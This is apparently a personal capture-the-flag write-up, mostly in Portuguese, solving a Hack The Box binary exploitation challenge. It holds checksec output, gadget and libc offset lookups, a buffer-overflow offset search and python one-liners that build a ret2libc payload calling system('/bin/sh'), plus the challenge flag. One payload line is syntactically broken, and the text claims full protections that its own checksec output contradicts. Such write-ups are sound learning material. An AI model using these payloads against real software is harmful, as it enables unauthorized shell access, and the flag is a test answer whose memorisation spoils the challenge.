Rocket Blaster XXX
Prepare for the ultimate showdown! Load your weapons, gear up for battle, 
and dive into the epic fray—let the fight commence!

checksec --file=rocket_blaster_xxx --output=json | jq
{
  "rocket_blaster_xxx": {
    "relro": "full",
    "canary": "no",
    "nx": "yes",
    "pie": "no",
    "rpath": "no",
    "runpath": "yes",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "2"
  }
}

relro (Read-Only Relocations):
	Descreve se as relocações da seção de leitura estão habilitadas.
	"full" significa que todas as relocações são marcadas como somente
	leitura.

canary:
	Indica se o sistema utiliza um "canary" como medida de segurança.
	"no" significa que não há um valor canary para proteger contra 
	ataques de estouro de pilha.
	
nx (No eXecute):
	Mostra se a execução de código na pilha está desativada.
	"yes" indica que a pilha é protegida contra a execução de código,
	o que ajuda a prevenir ataques de injeção de código.
	
pie (Position Independent Executable):
	Indica se o executável suporta a técnica PIE.
	"no" significa que o executável não é executado como um executável
	independente de posição, o que pode afetar a aleatorização de 
	endereços de memória (ASLR).

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

deadbeef
deadbabe
dead1337


python2.7 -c 'print "A"*32 + "B"*4 + "C"*4 + "\xf5\x12\x40\x00\x00\x00\x00\x00\xf5\x12\x40" +  +  + ' > output

python2.7 -c 'print "A"*32 + "B"*4 + "C"*4 + "\xf5\x12\x40\x00\x00\x00\x00\x00" + "D"*100 + "\xef\xbe\xad\xde\x00\x00\x00\x00" + "\xbe\xba\xad\xde\x00\x00\x00\x00" + "\x07\x13\xad\xde\x00\x00\x00\x00"' > output

EBP + 4 == return address


Parece um ret2libc. O programa possui todas as proteções, portanto uma
saída é tentar utilizar alguma vulnerabilidade pela libc.

Para isso, precisamos encontrar:
1. endereço da string "/bin/sh"
2. endereço da função exit()
3. endereço da função system()

podemos extrair essas infos com:
readelf -s ./glibc/libc.so.6 | grep system
  1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5

// dentro da libc, precisamos executar: system("/bin/sh")
// encontrar onde a libc começa no programa
ldd rocket_blaster_xxx
        linux-vdso.so.1 (0x00007fff639f5000)
        libc.so.6 => ./glibc/libc.so.6 (0x000072159a200000)
        ./glibc/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x000072159a4a3000)

// o inicio da libc: 0x000072159a200000
// para encontrar o endereço de "/bin/sh":
strings -a -t x ./glibc/libc.so.6 | grep "/bin/sh"
1d8678 /bin/sh

// Note that instead of passing the parameter in after the return pointer, you will have to
use a 'pop rdi; ret' gadget to put it into the RDI register.

ROPgadget --binary rocket_blaster_xxx | grep rdi
0x0000000000401360 : movsb byte ptr [rdi], byte ptr [rsi] ; or al, 0 ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x00000000004011e6 : or dword ptr [rdi + 0x405010], edi ; jmp rax
---> 0x000000000040159f : pop rdi ; ret 

Agora precisamos encontrar quantos bytes precisam ser enviados para o programa para
sobrescrever o return address:

gef>  pattern create 100
[+] Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef> r
(...)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Program received signal SIGSEGV, Segmentation fault.

Nesse momento, temos o segfault e o endereço de retorno sobrescrito.
gef>  pattern offset $rsp
[+] Searching for '6661616161616161'/'6161616161616166' with period=8
[+] Found at offset 40 (little-endian search) likely

Portanto precisamos enviar 40 bytes de lixo e o restante será o payload de ataque para
sobrescrever o retorno com o endereço que desejamos.

payload = A*40 + pop rdi + address of "/bin/sh" + endereço de system() + return address

libc_base = 0x7ffff7c00000

pop_rdi = 0x40159f
binsh = libc_base + 0x1d8678 == 0x7ffff7dd8678
system = libc_base + 0x050d70 == 0x7ffff7c50d70

python2.7 -c 'print "A"*40 + "\x9f\x15\x40\x00\x00\x00\x00\x00" + "\x78\x86\xdd\xf7\xff\x7f\x00\x00" + "\xa0\x40\x15\x00\x00\x00\x00\x00" + "\x70\x0d\xc5\xf7\xff\x7f\x00\x00"' > output

0x7ffff7c50d70
0x7ffff7c455f0
0x7ffff7dd8678


https://stacklikemind.io/ret2libc-aslr

Executando o solve.py:
HTB{b00m_b00m_r0ck3t_2_th3_m00n}